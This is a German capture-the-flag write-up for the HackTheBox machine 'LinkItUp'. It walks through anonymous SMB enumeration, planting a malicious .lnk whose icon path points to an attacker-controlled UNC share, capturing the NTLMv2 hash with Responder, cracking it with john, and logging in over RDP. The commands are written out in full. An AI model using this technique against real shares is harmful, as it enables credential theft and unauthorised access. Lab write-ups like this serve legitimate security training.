---
tags: [htb, windows, easy, writeup]
cve: none (Mark of the Web, kein CVE)
techniques: [smb-enum, ntlm-leak, hash-cracking]
---
# LinkItUp (HTB)

| Feld               | Wert            |
| ------------------ | --------------- |
| OS                 | Windows         |
| Difficulty         | Easy            |
| Box IP             | `10.129.234.64` |
| Attacker IP (tun0) | `<tun0-ip>`     |

> [!info] Kill Chain
> [[SMB Enumeration]] (anon Share) → bösartige `.lnk` auf Share → Opfer-Rechtsklick löst [[NTLM Hash Leak]] aus → Hash via [[Responder]] gefangen → [[Hash Cracking]] (john) → Creds → RDP → **Flag**

> [!note] Die Lücke – was die Auth auslöst
> Eine `.lnk` enthält einen **Icon-Pfad**. Zeigt dieser auf einen UNC-Pfad (`\\<attacker-ip>\share`), muss Windows das Icon über SMB von dort laden, sobald der Explorer die Datei **darstellt** (Ordneransicht / Vorschau / Rechtsklick) – kein Klick auf die Datei nötig.
> Der SMB-Verbindungsaufbau triggert automatisch die **NTLM-Authentifizierung** → der NTLMv2-Hash des angezeigten Users geht an den UNC-Host (= mein Responder). Betrifft alle Windows-Versionen. Microsoft blockt das nur bei Internet-Downloads via *Mark of the Web* → **kein CVE**; Dateien auf internen **Shares** tragen kein MotW → weiter verwundbar. Mechanismus: [[NTLM Hash Leak]].

---

# 1 · Enumeration

## Ports → [[nmap]]
```bash
nmap -sV -sC 10.129.234.64
```
- `-sV` = Dienst-Versionen, `-sC` = Standard-Skripte
- SMB (445) + RDP (3389) offen → Angriffsweg: Einstieg über SMB, finaler Zugriff per RDP

## Shares anonym → [[SMB Enumeration]]
```bash
smbclient -L //10.129.234.64/share -N
# => beschreibbarer Share gefunden
```
- `-N` = ohne Passwort (Null-Session), prüft anonymen Zugriff → bei fehlkonfigurierten Shares häufig möglich
- Share muss **beschreibbar** sein (nicht nur lesbar) → sonst lässt sich keine eigene Datei ablegen

---

# 2 · Credential Access → [[NTLM Hash Leak]]

## 2.1 Bösartige `.lnk` bauen
`poc.c` so anpassen, dass die `.lnk` auf die **eigene IP** zeigt (`\\<tun0-ip>\share`).
```bash
x86_64-w64-mingw32-gcc -o poc poc.c   # unter Linux kompilieren => poc.exe
wine poc.exe                          # .exe ausführen => poc.lnk
```
> `mingw32-gcc` kompiliert Windows-Binaries unter Linux, `wine` führt sie aus.
- der entscheidende Teil ist der **Icon-Pfad** der `.lnk` → zeigt er auf `\\<tun0-ip>\share`, lädt Windows das Icon über SMB von meiner Maschine, sobald der Explorer die Datei darstellt → dabei wird der NTLM-Hash übermittelt
- im `poc.c` die **eigene tun0-IP** eintragen, nicht die der Box (sonst wird der Hash an die falsche Adresse gesendet)

## 2.2 `.lnk` auf den Share legen
```bash
smbclient //10.129.234.64/share -N -c 'put poc.lnk'
```
- `put` lädt die Datei auf den Share → der simulierte User öffnet dort den Ordner
- schon das **Darstellen** der Datei im Explorer löst das Icon-Rendering aus (kein Klick/Öffnen der `.lnk` nötig) → SMB-Verbindung zu mir → Hash wird übertragen

## 2.3 Hash abfangen → [[Responder]]
```bash
responder -I tun0 -P
# wartet auf SMB-Auth; sobald der User den Ordner ansieht => NTLMv2-Hash erscheint
```
- Responder emuliert den SMB-Server, nimmt die Authentifizierung entgegen und protokolliert den Hash
- `-I tun0` = lauscht auf dem VPN-Interface → warten, bis der Hash in der Konsole erscheint

## 2.4 Hash cracken → [[Hash Cracking]]
```bash
john --wordlist=/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt hash.txt
# => Klartext-Passwort
```
- NTLMv2 ist nicht für Pass-the-Hash geeignet → muss offline geknackt werden, um das Klartext-Passwort zu erhalten
- `john` hasht jedes Wort aus `rockyou.txt` und vergleicht mit dem Ziel-Hash → Treffer = Passwort

---

# 3 · Zugriff → Flag

```bash
xfreerdp3 /v:10.129.234.64 /u:<user> /p:<password> /cert:ignore
# => Desktop, Flag auslesen
```
- mit den Credentials per RDP (3389) anmelden. `/cert:ignore` akzeptiert das selbstsignierte Zertifikat
- Zugriff auf den Desktop → Flag auslesen
